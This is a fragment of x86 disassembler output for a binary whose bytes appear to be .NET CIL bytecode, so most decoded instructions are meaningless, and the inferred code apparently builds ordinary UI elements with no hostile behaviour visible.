  402566:	0a 6f 4b             	or     0x4b(%edi),%ch
  402569:	00 00                	add    %al,(%eax)
  40256b:	0a de                	or     %dh,%bl
  40256d:	03 26                	add    (%esi),%esp
  40256f:	de 00                	fiadds (%eax)
  402571:	06                   	push   %es
  402572:	16                   	push   %ss
  402573:	6f                   	outsl  %ds:(%esi),(%dx)
  402574:	4c                   	dec    %esp
  402575:	00 00                	add    %al,(%eax)
  402577:	0a 06                	or     (%esi),%al
  402579:	16                   	push   %ss
  40257a:	6f                   	outsl  %ds:(%esi),(%dx)
  40257b:	4d                   	dec    %ebp
  40257c:	00 00                	add    %al,(%eax)
  40257e:	0a 06                	or     (%esi),%al
  402580:	09 6f 4e             	or     %ebp,0x4e(%edi)
  402583:	00 00                	add    %al,(%eax)
  402585:	0a 06                	or     (%esi),%al
  402587:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40258a:	4f                   	dec    %edi
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 06                	or     (%esi),%al
  40258f:	6f                   	outsl  %ds:(%esi),(%dx)
  402590:	50                   	push   %eax
  402591:	00 00                	add    %al,(%eax)
  402593:	0a 13                	or     (%ebx),%dl
  402595:	07                   	pop    %es
  402596:	04 08                	add    $0x8,%al
  402598:	6f                   	outsl  %ds:(%esi),(%dx)
  402599:	51                   	push   %ecx
  40259a:	00 00                	add    %al,(%eax)
  40259c:	0a 51 11             	or     0x11(%ecx),%dl
  40259f:	07                   	pop    %es
  4025a0:	2a 00                	sub    (%eax),%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	01 10                	add    %edx,(%eax)
  4025a6:	00 00                	add    %al,(%eax)
  4025a8:	00 00                	add    %al,(%eax)
  4025aa:	07                   	pop    %es
  4025ab:	02 17                	add    (%edi),%dl
  4025ad:	1e                   	push   %ds
  4025ae:	02 03                	add    (%ebx),%al
  4025b0:	01 00                	add    %eax,(%eax)
  4025b2:	00 01                	add    %al,(%ecx)
  4025b4:	2a 02                	sub    (%edx),%al
  4025b6:	03 04 16             	add    (%esi,%edx,1),%eax
  4025b9:	28 20                	sub    %ah,(%eax)
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	2a 1e                	sub    (%esi),%bl
  4025c0:	02 28                	add    (%eax),%ch
  4025c2:	13 00                	adc    (%eax),%eax
  4025c4:	00 0a                	add    %cl,(%edx)
  4025c6:	2a 00                	sub    (%eax),%al
  4025c8:	1b 30                	sbb    (%eax),%esi
  4025ca:	05 00 ed 02 00       	add    $0x2ed00,%eax
  4025cf:	00 06                	add    %al,(%esi)
  4025d1:	00 00                	add    %al,(%eax)
  4025d3:	11 02                	adc    %eax,(%edx)
  4025d5:	2d 02 15 2a 02       	sub    $0x22a1502,%eax
  4025da:	6f                   	outsl  %ds:(%esi),(%dx)
  4025db:	52                   	push   %edx
  4025dc:	00 00                	add    %al,(%eax)
  4025de:	0a 17                	or     (%edi),%dl
  4025e0:	2f                   	das
  4025e1:	02 15 2a 73 1a 00    	add    0x1a732a,%dl
  4025e7:	00 0a                	add    %cl,(%edx)
  4025e9:	0a 06                	or     (%esi),%al
  4025eb:	22 00                	and    (%eax),%al
  4025ed:	00 c0                	add    %al,%al
  4025ef:	40                   	inc    %eax
  4025f0:	22 00                	and    (%eax),%al
  4025f2:	00 50 41             	add    %dl,0x41(%eax)
  4025f5:	73 2c                	jae    0x402623
  4025f7:	00 00                	add    %al,(%eax)
  4025f9:	0a 6f 2d             	or     0x2d(%edi),%ch
  4025fc:	00 00                	add    %al,(%eax)
  4025fe:	0a 06                	or     (%esi),%al
  402600:	17                   	pop    %ss
  402601:	6f                   	outsl  %ds:(%esi),(%dx)
  402602:	2e 00 00             	add    %al,%cs:(%eax)
  402605:	0a 02                	or     (%edx),%al
  402607:	6f                   	outsl  %ds:(%esi),(%dx)
  402608:	52                   	push   %edx
  402609:	00 00                	add    %al,(%eax)
  40260b:	0a 8d 4e 00 00 01    	or     0x100004e(%ebp),%cl
  402611:	0b 73 53             	or     0x53(%ebx),%esi
  402614:	00 00                	add    %al,(%eax)
  402616:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  402619:	31 00                	xor    %eax,(%eax)
  40261b:	00 0a                	add    %cl,(%edx)
  40261d:	0d 1f 13 13 04       	or     $0x413131f,%eax
  402622:	16                   	push   %ss
  402623:	13 05 05 28 0f 00    	adc    0xf2805,%eax
  402629:	00 0a                	add    %cl,(%edx)
  40262b:	2d 6e 73 2f 00       	sub    $0x2f736e,%eax
  402630:	00 0a                	add    %cl,(%edx)
  402632:	13 06                	adc    (%esi),%eax
  402634:	11 06                	adc    %eax,(%esi)
  402636:	05 6f 32 00 00       	add    $0x326f,%eax
  40263b:	0a 11                	or     (%ecx),%dl
  40263d:	06                   	push   %es
  40263e:	1f                   	pop    %ds
  40263f:	09 1f                	or     %ebx,(%edi)
  402641:	13 73 33             	adc    0x33(%ebx),%esi
  402644:	00 00                	add    %al,(%eax)
  402646:	0a 6f 34             	or     0x34(%edi),%ch
  402649:	00 00                	add    %al,(%eax)
  40264b:	0a 11                	or     (%ecx),%dl
  40264d:	06                   	push   %es
  40264e:	06                   	push   %es
  40264f:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  402655:	36 00 00             	add    %al,%ss:(%eax)
  402658:	0a 13                	or     (%ebx),%dl
  40265a:	0c 12                	or     $0x12,%al
  40265c:	0c 28                	or     $0x28,%al
  40265e:	37                   	aaa
  40265f:	00 00                	add    %al,(%eax)
  402661:	0a 1b                	or     (%ebx),%bl
  402663:	5a                   	pop    %edx
  402664:	1e                   	push   %ds
  402665:	5b                   	pop    %ebx
  402666:	1f                   	pop    %ds
  402667:	12 59 16             	adc    0x16(%ecx),%bl
  40266a:	73 38                	jae    0x4026a4
  40266c:	00 00                	add    %al,(%eax)
  40266e:	0a 6f 39             	or     0x39(%edi),%ch
  402671:	00 00                	add    %al,(%eax)
  402673:	0a 11                	or     (%ecx),%dl
  402675:	06                   	push   %es
  402676:	17                   	pop    %ss
  402677:	6f                   	outsl  %ds:(%esi),(%dx)
  402678:	3a 00                	cmp    (%eax),%al
  40267a:	00 0a                	add    %cl,(%edx)
  40267c:	06                   	push   %es
  40267d:	6f                   	outsl  %ds:(%esi),(%dx)
  40267e:	3b 00                	cmp    (%eax),%eax
  402680:	00 0a                	add    %cl,(%edx)
  402682:	11 06                	adc    %eax,(%esi)
  402684:	6f                   	outsl  %ds:(%esi),(%dx)
  402685:	3c 00                	cmp    $0x0,%al
  402687:	00 0a                	add    %cl,(%edx)
  402689:	11 06                	adc    %eax,(%esi)
  40268b:	6f                   	outsl  %ds:(%esi),(%dx)
  40268c:	3e 00 00             	add    %al,%ds:(%eax)
  40268f:	0a 13                	or     (%ebx),%dl
  402691:	04 11                	add    $0x11,%al
  402693:	06                   	push   %es
  402694:	6f                   	outsl  %ds:(%esi),(%dx)
  402695:	3f                   	aas
  402696:	00 00                	add    %al,(%eax)
  402698:	0a 13                	or     (%ebx),%dl
  40269a:	05 16 13 07 06       	add    $0x6071316,%eax
  40269f:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  4026a5:	36 00 00             	add    %al,%ss:(%eax)
  4026a8:	0a 13                	or     (%ebx),%dl
  4026aa:	0d 12 0d 28 37       	or     $0x37280d12,%eax
  4026af:	00 00                	add    %al,(%eax)
  4026b1:	0a 1b                	or     (%ebx),%bl
  4026b3:	5a                   	pop    %edx
  4026b4:	1e                   	push   %ds
  4026b5:	5b                   	pop    %ebx
  4026b6:	1f                   	pop    %ds
  4026b7:	12 59 13             	adc    0x13(%ecx),%bl
  4026ba:	08 02                	or     %al,(%edx)
  4026bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4026bd:	54                   	push   %esp
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	0a 13                	or     (%ebx),%dl
  4026c2:	0e                   	push   %cs
  4026c3:	38 ed                	cmp    %ch,%ch
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	00 11                	add    %dl,(%ecx)
  4026c9:	0e                   	push   %cs
  4026ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4026cb:	55                   	push   %ebp
  4026cc:	00 00                	add    %al,(%eax)
  4026ce:	0a 13                	or     (%ebx),%dl
  4026d0:	09 07                	or     %eax,(%edi)
  4026d2:	11 07                	adc    %eax,(%edi)
  4026d4:	73 56                	jae    0x40272c
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	0a a2 07 11 07 9a    	or     -0x65f8eef9(%edx),%ah
  4026de:	11 09                	adc    %ecx,(%ecx)
  4026e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e1:	57                   	push   %edi
  4026e2:	00 00                	add    %al,(%eax)
  4026e4:	0a 6f 32             	or     0x32(%edi),%ch
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	0a 11                	or     (%ecx),%dl
  4026eb:	07                   	pop    %es
  4026ec:	03 33                	add    (%ebx),%esi
  4026ee:	0a 07                	or     (%edi),%al
  4026f0:	11 07                	adc    %eax,(%edi)
  4026f2:	9a 17 6f 58 00 00 0a 	lcall  $0xa00,$0x586f17
  4026f9:	07                   	pop    %es
  4026fa:	11 07                	adc    %eax,(%edi)
  4026fc:	9a 1f 09 11 04 73 33 	lcall  $0x3373,$0x411091f
  402703:	00 00                	add    %al,(%eax)
  402705:	0a 6f 34             	or     0x34(%edi),%ch
  402708:	00 00                	add    %al,(%eax)
  40270a:	0a 07                	or     (%edi),%al
  40270c:	11 07                	adc    %eax,(%edi)
  40270e:	9a 17 6f 3a 00 00 0a 	lcall  $0xa00,$0x3a6f17
  402715:	06                   	push   %es
  402716:	6f                   	outsl  %ds:(%esi),(%dx)
  402717:	3b 00                	cmp    (%eax),%eax
  402719:	00 0a                	add    %cl,(%edx)
  40271b:	07                   	pop    %es
  40271c:	11 07                	adc    %eax,(%edi)
  40271e:	9a 6f 3c 00 00 0a 07 	lcall  $0x70a,$0x3c6f
  402725:	11 07                	adc    %eax,(%edi)
  402727:	9a 6f 59 00 00 0a 11 	lcall  $0x110a,$0x596f
  40272e:	08 31                	or     %dh,(%ecx)
  402730:	3c 07                	cmp    $0x7,%al
  402732:	11 07                	adc    %eax,(%edi)
  402734:	9a 6f 5a 00 00 0a 13 	lcall  $0x130a,$0x5a6f
  40273b:	0a 07                	or     (%edi),%al
  40273d:	11 07                	adc    %eax,(%edi)
  40273f:	9a 11 0a 17 07 11 07 	lcall  $0x711,$0x7170a11
  402746:	9a 6f 59 00 00 0a 17 	lcall  $0x170a,$0x596f
  40274d:	59                   	pop    %ecx
  40274e:	11 08                	adc    %ecx,(%eax)
  402750:	5b                   	pop    %ebx
  402751:	58                   	pop    %eax
  402752:	5a                   	pop    %edx
  402753:	6f                   	outsl  %ds:(%esi),(%dx)
  402754:	5b                   	pop    %ebx
  402755:	00 00                	add    %al,(%eax)
  402757:	0a 07                	or     (%edi),%al
  402759:	11 07                	adc    %eax,(%edi)
  40275b:	9a 11 08 6f 5c 00 00 	lcall  $0x0,$0x5c6f0811
  402762:	0a 07                	or     (%edi),%al
  402764:	11 07                	adc    %eax,(%edi)
  402766:	9a 16 6f 3a 00 00 0a 	lcall  $0xa00,$0x3a6f16
  40276d:	07                   	pop    %es
  40276e:	11 07                	adc    %eax,(%edi)
  402770:	9a 6f 3e 00 00 0a 13 	lcall  $0x130a,$0x3e6f
  402777:	04 07                	add    $0x7,%al
  402779:	11 07                	adc    %eax,(%edi)
  40277b:	9a 6f 3f 00 00 0a 11 	lcall  $0x110a,$0x3f6f
  402782:	05 31 0b 07 11       	add    $0x11070b31,%eax
  402787:	07                   	pop    %es
  402788:	9a 6f 3f 00 00 0a 13 	lcall  $0x130a,$0x3f6f
  40278f:	05 11 09 6f 5d       	add    $0x5d6f0911,%eax
  402794:	00 00                	add    %al,(%eax)
  402796:	0a 28                	or     (%eax),%ch
  402798:	0f 00 00             	sldt   (%eax)
  40279b:	0a 2d 11 08 07 11    	or     0x11070811,%ch
  4027a1:	07                   	pop    %es
  4027a2:	9a 11 09 6f 5d 00 00 	lcall  $0x0,$0x5d6f0911
  4027a9:	0a 6f 5e             	or     0x5e(%edi),%ch
  4027ac:	00 00                	add    %al,(%eax)
  4027ae:	0a 11                	or     (%ecx),%dl
  4027b0:	07                   	pop    %es
  4027b1:	17                   	pop    %ss
  4027b2:	58                   	pop    %eax
  4027b3:	13 07                	adc    (%edi),%eax
  4027b5:	11 0e                	adc    %ecx,(%esi)
  4027b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4027b8:	5f                   	pop    %edi
  4027b9:	00 00                	add    %al,(%eax)
  4027bb:	0a 3a                	or     (%edx),%bh
  4027bd:	07                   	pop    %es
  4027be:	ff                   	(bad)
  4027bf:	ff                   	(bad)
  4027c0:	ff                   	lcall  (bad)
  4027c1:	de 0c 11             	fimuls (%ecx,%edx,1)
  4027c4:	0e                   	push   %cs
  4027c5:	2c 07                	sub    $0x7,%al
  4027c7:	11 0e                	adc    %ecx,(%esi)
  4027c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ca:	60                   	pusha
  4027cb:	00 00                	add    %al,(%eax)
  4027cd:	0a dc                	or     %ah,%bl
  4027cf:	08 17                	or     %dl,(%edi)
  4027d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4027d2:	61                   	popa
  4027d3:	00 00                	add    %al,(%eax)
  4027d5:	0a 09                	or     (%ecx),%cl
  4027d7:	72 47                	jb     0x402820
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	70 6f                	jo     0x40284c
  4027dd:	32 00                	xor    (%eax),%al
  4027df:	00 0a                	add    %cl,(%edx)
  4027e1:	09 17                	or     %edx,(%edi)
  4027e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4027e4:	42                   	inc    %edx
  4027e5:	00 00                	add    %al,(%eax)
  4027e7:	0a 09                	or     (%ecx),%cl
  4027e9:	1f                   	pop    %ds
  4027ea:	0c 11                	or     $0x11,%al
  4027ec:	05 1f 4d 59 28       	add    $0x28594d1f,%eax
  4027f1:	43                   	inc    %ebx
  4027f2:	00 00                	add    %al,(%eax)
  4027f4:	0a 11                	or     (%ecx),%dl
  4027f6:	04 1f                	add    $0x1f,%al
  4027f8:	24 58                	and    $0x58,%al
  4027fa:	1f                   	pop    %ds
  4027fb:	4b                   	dec    %ebx
  4027fc:	1f                   	pop    %ds
  4027fd:	17                   	pop    %ss
  4027fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ff:	40                   	inc    %eax
  402800:	00 00                	add    %al,(%eax)
  402802:	0a 04 28             	or     (%eax,%ebp,1),%al
  402805:	0f 00 00             	sldt   (%eax)
  402808:	0a 2c 12             	or     (%edx,%edx,1),%ch
  40280b:	06                   	push   %es
  40280c:	28 29                	sub    %ch,(%ecx)
  40280e:	00 00                	add    %al,(%eax)
  402810:	0a 6f 2a             	or     0x2a(%edi),%ch
  402813:	00 00                	add    %al,(%eax)
  402815:	0a 6f 32             	or     0x32(%edi),%ch
  402818:	00 00                	add    %al,(%eax)
  40281a:	0a 2b                	or     (%ebx),%ch
  40281c:	07                   	pop    %es
  40281d:	06                   	push   %es
  40281e:	04 6f                	add    $0x6f,%al
  402820:	32 00                	xor    (%eax),%al
  402822:	00 0a                	add    %cl,(%edx)
  402824:	06                   	push   %es
  402825:	20 b2 00 00 00 11    	and    %dh,0x11000000(%edx)
  40282b:	05 1f 0a 58 28       	add    $0x28580a1f,%eax
  402830:	43                   	inc    %ebx
  402831:	00 00                	add    %al,(%eax)
  402833:	0a 11                	or     (%ecx),%dl
  402835:	04 1f                	add    $0x1f,%al
  402837:	47                   	inc    %edi
  402838:	58                   	pop    %eax
  402839:	73 38                	jae    0x402873
  40283b:	00 00                	add    %al,(%eax)
  40283d:	0a 6f 44             	or     0x44(%edi),%ch
  402840:	00 00                	add    %al,(%eax)
  402842:	0a 06                	or     (%esi),%al
  402844:	6f                   	outsl  %ds:(%esi),(%dx)
  402845:	3b 00                	cmp    (%eax),%eax
  402847:	00 0a                	add    %cl,(%edx)
  402849:	09 6f 3c             	or     %ebp,0x3c(%edi)
  40284c:	00 00                	add    %al,(%eax)
  40284e:	0a 06                	or     (%esi),%al
  402850:	19 6f 46             	sbb    %ebp,0x46(%edi)
  402853:	00 00                	add    %al,(%eax)
  402855:	0a 06                	or     (%esi),%al
  402857:	17                   	pop    %ss
  402858:	6f                   	outsl  %ds:(%esi),(%dx)
  402859:	47                   	inc    %edi
  40285a:	00 00                	add    %al,(%eax)
  40285c:	0a 06                	or     (%esi),%al
  40285e:	28 48 00             	sub    %cl,0x0(%eax)
  402861:	00 0a                	add    %cl,(%edx)
  402863:	6f                   	outsl  %ds:(%esi),(%dx)
  402864:	49                   	dec    %ecx
  402865:	00 00                	add    %al,(%eax)
  402867:	0a 28                	or     (%eax),%ch
  402869:	4a                   	dec    %edx
  40286a:	00 00                	add    %al,(%eax)
  40286c:	0a 6f 4b             	or     0x4b(%edi),%ch
  40286f:	00 00                	add    %al,(%eax)
  402871:	0a de                	or     %dh,%bl
  402873:	03 26                	add    (%esi),%esp
  402875:	de 00                	fiadds (%eax)
  402877:	06                   	push   %es
  402878:	16                   	push   %ss
  402879:	6f                   	outsl  %ds:(%esi),(%dx)
  40287a:	4c                   	dec    %esp
  40287b:	00 00                	add    %al,(%eax)
  40287d:	0a 06                	or     (%esi),%al
  40287f:	16                   	push   %ss
  402880:	6f                   	outsl  %ds:(%esi),(%dx)
  402881:	4d                   	dec    %ebp
  402882:	00 00                	add    %al,(%eax)
  402884:	0a 06                	or     (%esi),%al
  402886:	09 6f 4e             	or     %ebp,0x4e(%edi)
  402889:	00 00                	add    %al,(%eax)
  40288b:	0a 06                	or     (%esi),%al
  40288d:	6f                   	outsl  %ds:(%esi),(%dx)
  40288e:	50                   	push   %eax
  40288f:	00 00                	add    %al,(%eax)
  402891:	0a 17                	or     (%edi),%dl
  402893:	33 2a                	xor    (%edx),%ebp
  402895:	15 13 0b 16 13       	adc    $0x13160b13,%eax
  40289a:	07                   	pop    %es
  40289b:	2b 15 07 11 07 9a    	sub    0x9a071107,%edx
  4028a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4028a2:	62 00                	bound  %eax,(%eax)
  4028a4:	00 0a                	add    %cl,(%edx)
  4028a6:	2c 04                	sub    $0x4,%al
  4028a8:	11 07                	adc    %eax,(%edi)
  4028aa:	13 0b                	adc    (%ebx),%ecx
  4028ac:	11 07                	adc    %eax,(%edi)
  4028ae:	17                   	pop    %ss
  4028af:	58                   	pop    %eax
  4028b0:	13 07                	adc    (%edi),%eax
  4028b2:	11 07                	adc    %eax,(%edi)
  4028b4:	02 6f 52             	add    0x52(%edi),%ch
  4028b7:	00 00                	add    %al,(%eax)
  4028b9:	0a 32                	or     (%edx),%dh
  4028bb:	e1 11                	loope  0x4028ce
  4028bd:	0b 2a                	or     (%edx),%ebp
  4028bf:	15 2a 00 00 00       	adc    $0x2a,%eax
  4028c4:	41                   	inc    %ecx
  4028c5:	34 00                	xor    $0x0,%al
  4028c7:	00 02                	add    %al,(%edx)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 ef                	add    %ch,%bh
  4028cd:	00 00                	add    %al,(%eax)
  4028cf:	00 00                	add    %al,(%eax)
  4028d1:	01 00                	add    %eax,(%eax)
  4028d3:	00 ef                	add    %ch,%bh
  4028d5:	01 00                	add    %eax,(%eax)
  4028d7:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4028e2:	00 00                	add    %al,(%eax)
  4028e4:	89 02                	mov    %eax,(%edx)
  4028e6:	00 00                	add    %al,(%eax)
  4028e8:	17                   	pop    %ss
  4028e9:	00 00                	add    %al,(%eax)
  4028eb:	00 a0 02 00 00 03    	add    %ah,0x3000002(%eax)
  4028f1:	00 00                	add    %al,(%eax)
  4028f3:	00 01                	add    %al,(%ecx)
  4028f5:	00 00                	add    %al,(%eax)
  4028f7:	01 1e                	add    %ebx,(%esi)
  4028f9:	02 28                	add    (%eax),%ch
  4028fb:	13 00                	adc    (%eax),%eax
  4028fd:	00 0a                	add    %cl,(%edx)
  4028ff:	2a 13                	sub    (%ebx),%dl
  402901:	30 06                	xor    %al,(%esi)
  402903:	00 50 00             	add    %dl,0x0(%eax)
  402906:	00 00                	add    %al,(%eax)
  402908:	07                   	pop    %es
  402909:	00 00                	add    %al,(%eax)
  40290b:	11 1f                	adc    %ebx,(%edi)
  40290d:	40                   	inc    %eax
  40290e:	73 63                	jae    0x402973
  402910:	00 00                	add    %al,(%eax)
  402912:	0a 0a                	or     (%edx),%cl
  402914:	20 00                	and    %al,(%eax)
  402916:	01 00                	add    %eax,(%eax)
  402918:	00 8d 53 00 00 01    	add    %cl,0x1000053(%ebp)
  40291e:	0b 03                	or     (%ebx),%eax
  402920:	2c 09                	sub    $0x9,%al
  402922:	07                   	pop    %es
  402923:	1f                   	pop    %ds
  402924:	10 20                	adc    %ah,(%eax)
  402926:	ff 00                	incl   (%eax)
  402928:	00 00                	add    %al,(%eax)
  40292a:	9c                   	pushf
  40292b:	04 2c                	add    $0x2c,%al
  40292d:	12 07                	adc    (%edi),%al
  40292f:	1f                   	pop    %ds
  402930:	11 20                	adc    %esp,(%eax)
  402932:	ff 00                	incl   (%eax)
  402934:	00 00                	add    %al,(%eax)
  402936:	9c                   	pushf
  402937:	07                   	pop    %es
  402938:	1f                   	pop    %ds
  402939:	12 20                	adc    (%eax),%ah
  40293b:	ff 00                	incl   (%eax)
  40293d:	00 00                	add    %al,(%eax)
  40293f:	9c                   	pushf
  402940:	02 16                	add    (%esi),%dl
  402942:	07                   	pop    %es
  402943:	06                   	push   %es
  402944:	1f                   	pop    %ds
  402945:	40                   	inc    %eax
  402946:	16                   	push   %ss
  402947:	28 25 00 00 06 17    	sub    %ah,0x17060000
  40294d:	32 07                	xor    (%edi),%al
  40294f:	06                   	push   %es
  402950:	6f                   	outsl  %ds:(%esi),(%dx)
  402951:	12 00                	adc    (%eax),%al
  402953:	00 0a                	add    %cl,(%edx)
  402955:	2a 72 5b             	sub    0x5b(%edx),%dh
  402958:	00 00                	add    %al,(%eax)
  40295a:	70 2a                	jo     0x402986
  40295c:	1b 30                	sbb    (%eax),%esi
  40295e:	04 00                	add    $0x0,%al
  402960:	03 01                	add    (%ecx),%eax
  402962:	00 00                	add    %al,(%eax)
  402964:	08 00                	or     %al,(%eax)
  402966:	00 11                	add    %dl,(%ecx)
  402968:	73 29                	jae    0x402993
  40296a:	00 00                	add    %al,(%eax)
  40296c:	06                   	push   %es
  40296d:	0a 73 2f             	or     0x2f(%ebx),%dh
  402970:	00 00                	add    %al,(%eax)
  402972:	0a 0b                	or     (%ebx),%cl
  402974:	03 28                	add    (%eax),%ebp
  402976:	0f 00 00             	sldt   (%eax)
  402979:	0a 2c 0d 07 72 5f 00 	or     0x5f7207(,%ecx,1),%ch
  402980:	00 70 6f             	add    %dh,0x6f(%eax)
  402983:	32 00                	xor    (%eax),%al
  402985:	00 0a                	add    %cl,(%edx)
  402987:	2b 07                	sub    (%edi),%eax
  402989:	07                   	pop    %es
  40298a:	03 6f 32             	add    0x32(%edi),%ebp
  40298d:	00 00                	add    %al,(%eax)
  40298f:	0a 07                	or     (%edi),%al
  402991:	1f                   	pop    %ds
  402992:	09 1f                	or     %ebx,(%edi)
  402994:	13 73 33             	adc    0x33(%ebx),%esi
  402997:	00 00                	add    %al,(%eax)
  402999:	0a 6f 34             	or     0x34(%edi),%ch
  40299c:	00 00                	add    %al,(%eax)
  40299e:	0a 07                	or     (%edi),%al
  4029a0:	06                   	push   %es
  4029a1:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  4029a7:	36 00 00             	add    %al,%ss:(%eax)
  4029aa:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4029ad:	02 28                	add    (%eax),%ch
  4029af:	37                   	aaa
  4029b0:	00 00                	add    %al,(%eax)
  4029b2:	0a 1b                	or     (%ebx),%bl
  4029b4:	5a                   	pop    %edx
  4029b5:	1e                   	push   %ds
  4029b6:	5b                   	pop    %ebx
  4029b7:	1f                   	pop    %ds
  4029b8:	12 59 16             	adc    0x16(%ecx),%bl
  4029bb:	73 38                	jae    0x4029f5
  4029bd:	00 00                	add    %al,(%eax)
  4029bf:	0a 6f 39             	or     0x39(%edi),%ch
  4029c2:	00 00                	add    %al,(%eax)
  4029c4:	0a 07                	or     (%edi),%al
  4029c6:	17                   	pop    %ss
  4029c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c8:	3a 00                	cmp    (%eax),%al
  4029ca:	00 0a                	add    %cl,(%edx)
  4029cc:	06                   	push   %es
  4029cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4029ce:	3b 00                	cmp    (%eax),%eax
  4029d0:	00 0a                	add    %cl,(%edx)
  4029d2:	07                   	pop    %es
  4029d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4029d4:	3c 00                	cmp    $0x0,%al
  4029d6:	00 0a                	add    %cl,(%edx)
  4029d8:	02 28                	add    (%eax),%ch
  4029da:	0f 00 00             	sldt   (%eax)
  4029dd:	0a 2c 12             	or     (%edx,%edx,1),%ch
  4029e0:	06                   	push   %es
  4029e1:	28 29                	sub    %ch,(%ecx)
  4029e3:	00 00                	add    %al,(%eax)
  4029e5:	0a 6f 2a             	or     0x2a(%edi),%ch
  4029e8:	00 00                	add    %al,(%eax)
  4029ea:	0a 6f 32             	or     0x32(%edi),%ch
  4029ed:	00 00                	add    %al,(%eax)
  4029ef:	0a 2b                	or     (%ebx),%ch
  4029f1:	07                   	pop    %es
  4029f2:	06                   	push   %es
  4029f3:	02 6f 32             	add    0x32(%edi),%ch
  4029f6:	00 00                	add    %al,(%eax)
  4029f8:	0a 06                	or     (%esi),%al
  4029fa:	20 b2 00 00 00 07    	and    %dh,0x7000000(%edx)
  402a00:	6f                   	outsl  %ds:(%esi),(%dx)
  402a01:	3f                   	aas
  402a02:	00 00                	add    %al,(%eax)
  402a04:	0a 1f                	or     (%edi),%bl
  402a06:	0a 58 28             	or     0x28(%eax),%bl
  402a09:	43                   	inc    %ebx
  402a0a:	00 00                	add    %al,(%eax)
  402a0c:	0a 07                	or     (%edi),%al
  402a0e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a0f:	3e 00 00             	add    %al,%ds:(%eax)
  402a12:	0a 1f                	or     (%edi),%bl
  402a14:	37                   	aaa
  402a15:	58                   	pop    %eax
  402a16:	73 38                	jae    0x402a50
  402a18:	00 00                	add    %al,(%eax)
  402a1a:	0a 6f 44             	or     0x44(%edi),%ch
  402a1d:	00 00                	add    %al,(%eax)
  402a1f:	0a 06                	or     (%esi),%al
  402a21:	19 6f 46             	sbb    %ebp,0x46(%edi)
  402a24:	00 00                	add    %al,(%eax)
  402a26:	0a 06                	or     (%esi),%al
  402a28:	17                   	pop    %ss
  402a29:	6f                   	outsl  %ds:(%esi),(%dx)
  402a2a:	47                   	inc    %edi
  402a2b:	00 00                	add    %al,(%eax)
  402a2d:	0a 06                	or     (%esi),%al
  402a2f:	28 48 00             	sub    %cl,0x0(%eax)
  402a32:	00 0a                	add    %cl,(%edx)
  402a34:	6f                   	outsl  %ds:(%esi),(%dx)
  402a35:	49                   	dec    %ecx
  402a36:	00 00                	add    %al,(%eax)
  402a38:	0a 28                	or     (%eax),%ch
  402a3a:	4a                   	dec    %edx
  402a3b:	00 00                	add    %al,(%eax)
  402a3d:	0a 6f 4b             	or     0x4b(%edi),%ch
  402a40:	00 00                	add    %al,(%eax)
  402a42:	0a de                	or     %dh,%bl
  402a44:	03 26                	add    (%esi),%esp
  402a46:	de 00                	fiadds (%eax)
  402a48:	06                   	push   %es
  402a49:	16                   	push   %ss
  402a4a:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4b:	4c                   	dec    %esp
  402a4c:	00 00                	add    %al,(%eax)
  402a4e:	0a 06                	or     (%esi),%al
  402a50:	16                   	push   %ss
  402a51:	6f                   	outsl  %ds:(%esi),(%dx)
  402a52:	4d                   	dec    %ebp
  402a53:	00 00                	add    %al,(%eax)
  402a55:	0a 06                	or     (%esi),%al
  402a57:	04 7d                	add    $0x7d,%al
  402a59:	27                   	daa
  402a5a:	00 00                	add    %al,(%eax)
  402a5c:	04 06                	add    $0x6,%al
  402a5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a5f:	50                   	push   %eax
  402a60:	00 00                	add    %al,(%eax)
  402a62:	0a 26                	or     (%esi),%ah
  402a64:	06                   	push   %es
  402a65:	7b 28                	jnp    0x402a8f
  402a67:	00 00                	add    %al,(%eax)
  402a69:	04 2a                	add    $0x2a,%al
  402a6b:	00 01                	add    %al,(%ecx)
  402a6d:	10 00                	adc    %al,(%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 c6                	add    %al,%dh
  402a73:	00 17                	add    %dl,(%edi)
  402a75:	dd 00                	fldl   (%eax)
  402a77:	03 01                	add    (%ecx),%eax
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	01 1e                	add    %ebx,(%esi)
  402a7d:	02 28                	add    (%eax),%ch
  402a7f:	13 00                	adc    (%eax),%eax
  402a81:	00 0a                	add    %cl,(%edx)
  402a83:	2a 03                	sub    (%ebx),%al
  402a85:	30 03                	xor    %al,(%ebx)
  402a87:	00 4e 00             	add    %cl,0x0(%esi)
  402a8a:	00 00                	add    %al,(%eax)
  402a8c:	00 00                	add    %al,(%eax)
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	02 17                	add    (%edi),%dl
  402a92:	7d 27                	jge    0x402abb
  402a94:	00 00                	add    %al,(%eax)
  402a96:	04 02                	add    $0x2,%al
  402a98:	28 1a                	sub    %bl,(%edx)
  402a9a:	00 00                	add    %al,(%eax)
